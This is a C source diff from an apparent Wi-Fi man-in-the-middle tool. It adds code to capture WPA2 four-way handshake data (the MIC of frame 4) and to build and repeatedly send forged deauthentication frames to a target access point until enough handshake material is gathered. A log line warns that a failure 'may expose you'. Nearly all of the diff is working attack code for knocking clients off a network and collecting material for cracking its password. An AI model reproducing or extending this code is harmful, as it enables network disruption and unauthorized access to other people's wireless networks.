@@ -16,7 +16,9 @@ static int parse_auth_data(const char *buf, size_t len,
 	
 	packet->auth_data = *(struct ieee_8021x_authentication*) (buf + *offset);
 	*offset += sizeof(struct ieee_8021x_authentication);
-	if (*offset > len) return -1;
+	if (*offset - 8 > len) return -1; 
+	/* The 1 and 4 of handshake have not key payload,
+	 * so the size of handshake structure will big than length of packet.*/
 
 	packet->auth_data.data = (buf + *offset);
 	packet->auth_data.len = ntohs(packet->auth_data.len);
@@ -44,7 +46,12 @@ static int fill_encry_info(struct encrypto_info * info, const struct WPA2_handsh
 	}
 
 	/* frame 4 of 4-way handshake */
-	//if ()
+	if ((packet->auth_data.key_information & WPA_KEY_INFO_MIC) &&
+			!(packet->auth_data.key_information & WPA_KEY_INFO_ACK) &&
+			!(packet->auth_data.key_information & WPA_KEY_INFO_INSTALL)) {
+		memcpy(info->MIC, packet->auth_data.MIC, MD5_DIGEST_LENGTH);
+		
+	}
 
 
 }
@@ -62,7 +69,10 @@ void handle_four_way_shakehand(void *ctx, const uint8_t *src_addr, const char *b
 
 	if (offset > len) return;
 	uint16_t tmp123 = *(uint16_t *)(buf + offset);
+	if (tmp123 == 0x188 || tmp123 == 0x288)
+		log_printf(MSG_DEBUG, "subtype = 0x%x", tmp123);
 	type = parse_subtype(ntohs(*(uint16_t *)(buf + offset)));
+//		log_printf(MSG_DEBUG, "type = 0x%x", type);
 	switch (type) {
 		case IEEE80211_BEACON :;
 			/* XXX : Do we only maintance ap list in ap search state ?
@@ -123,7 +133,7 @@ void handle_four_way_shakehand(void *ctx, const uint8_t *src_addr, const char *b
 				break; 
 			packet = malloc(sizeof(struct WPA2_handshake_packet));
 			struct WPA2_handshake_packet *tmp = (struct WPA2_handshake_packet *)packet;
-		       	tmp->type = type;	
+			tmp->type = type;	
 			tmp->ieee80211_data = (struct ieee80211_hdr_3addr *)(buf + offset);
 			/* Ignore packet which not came from target access point. */
 			if (memcmp(LOCATE(u8 ,tmp->ieee80211_data, struct ieee80211_hdr_3addr, addr1)
@@ -135,7 +145,7 @@ void handle_four_way_shakehand(void *ctx, const uint8_t *src_addr, const char *b
 			parse_llc_header(buf, len, &offset, packet);
 
 			if (tmp->llc_hdr.type == 0x888e && 
-			   (MITM->state == MITM_state_crash_password)) {
+			   (MITM->state == MITM_state_capture_handshake)) {
 				parse_auth_data(buf, len, &offset, packet);
 				fill_encry_info(&MITM->encry_info, packet);
 			}
@@ -153,12 +163,12 @@ void handle_four_way_shakehand(void *ctx, const uint8_t *src_addr, const char *b
 			offset += sizeof(struct ieee80211_qos_hdr);
 			
 			parse_llc_header(buf, len , &offset, packet);
-
 			if (tmp->llc_hdr.type == 0x888e &&
-			   (MITM->state == MITM_state_crash_password))
+			   (MITM->state == MITM_state_capture_handshake))
 				parse_auth_data(buf, len, &offset, packet);
-		
 		break;}
+		case IEEE80211_DEAUTHENTICATION :
+		break; 
 
 		default:
 			return;
@@ -168,7 +178,7 @@ void handle_four_way_shakehand(void *ctx, const uint8_t *src_addr, const char *b
 	return;
 }
 
-static int prepare_deauth_pkt(u8 *buffer, size_t *pkt_len, u8 *victim, u8 *ap, u16 seq_num) {
+int prepare_deauth_pkt(u8 *buffer, size_t *pkt_len, u8 *victim, u8 *ap, u16 seq_num) {
 	int is_broadcast = 0;
 	if (!buffer || !ap) {
 		log_printf(MSG_WARNING, "[%s]buffer or ap not exist");
@@ -180,13 +190,32 @@ static int prepare_deauth_pkt(u8 *buffer, size_t *pkt_len, u8 *victim, u8 *ap, u
 	memset(&radiotap_hdr, 0, sizeof(struct ieee80211_radiotap_header));
 	radiotap_hdr.it_version = 0;
 	radiotap_hdr.it_pad = 0;
-	radiotap_hdr.it_len = 13;
+	radiotap_hdr.it_len = 26;
 	radiotap_hdr.it_present = htonl(IEEE80211_RADIOTAP_RATE);
-	radiotap_hdr.padload = 0x02;
+//	radiotap_hdr.padload = 0x02;
+	radiotap_hdr.padload = malloc(sizeof(uint8_t) * 18);
+	*radiotap_hdr.padload++ = 0x7b;
+	*radiotap_hdr.padload++ = 0x35;
+	*radiotap_hdr.padload++ = 0x4f;
+	*radiotap_hdr.padload++ = 0x21;
+	*radiotap_hdr.padload++ = 0x00;
+	*radiotap_hdr.padload++ = 0x00;
+	*radiotap_hdr.padload++ = 0x00;
+	*radiotap_hdr.padload++ = 0x00;
+	*radiotap_hdr.padload++ = 0x40;
+	*radiotap_hdr.padload++ = 0x30;
+	*radiotap_hdr.padload++ = 0xad;
+	*radiotap_hdr.padload++ = 0x16;
+	*radiotap_hdr.padload++ = 0x40;
+	*radiotap_hdr.padload++ = 0x01;
+	*radiotap_hdr.padload++ = 0xac;
+	*radiotap_hdr.padload++ = 0x00;
+	*radiotap_hdr.padload++ = 0x00;
+	*radiotap_hdr.padload = 0x00;
 
 	struct ieee80211_hdr_3addr deauth;
 	memset(&deauth, 0, sizeof(struct ieee80211_hdr_3addr));
-	deauth.frame_control = htons(0x000c);
+	deauth.frame_control = htons(0xc111);
 	if (is_broadcast) 
 		memset(deauth.addr2, 0xff, ETH_ALEN);
 	else 
@@ -211,14 +240,15 @@ void deauth_attack(void *eloop_data, void *user_ctx) {
 		return;
 	/* XXX : I am not really sure how to define the seqence num of packet */
 	ret = prepare_deauth_pkt(packet, &pkt_len, NULL, MITM->encry_info.AA, 9500);
-
-	if (MITM->encry_info.enough) {
-		ret = eloop_cancel_timeout(deauth_attack, NULL, MITM);
-		if (!ret) {
-			log_printf(MSG_WARNING, "[Deauth]unregister deauth attack to"
-					" timeout event failure, it may expose you!");
-		}
+	if (ret < 0) {
+		log_printf(MSG_WARNING, "[Deauth]Prepare deauthentication packet failed.");
 	}
+	ret = l2_packet_send(MITM->l2_packet, MITM->encry_info.AA, ETH_P_802_2, packet, pkt_len);
+	if (ret < 0) {
+		log_printf(MSG_WARNING, "[Deauth]Send deauth packet failed, with error:%s", strerror(errno));
+	}
+	if (!MITM->encry_info.enough) 
+		eloop_register_timeout(1, 0, deauth_attack, NULL, MITM);
 	free(packet);
 }
 
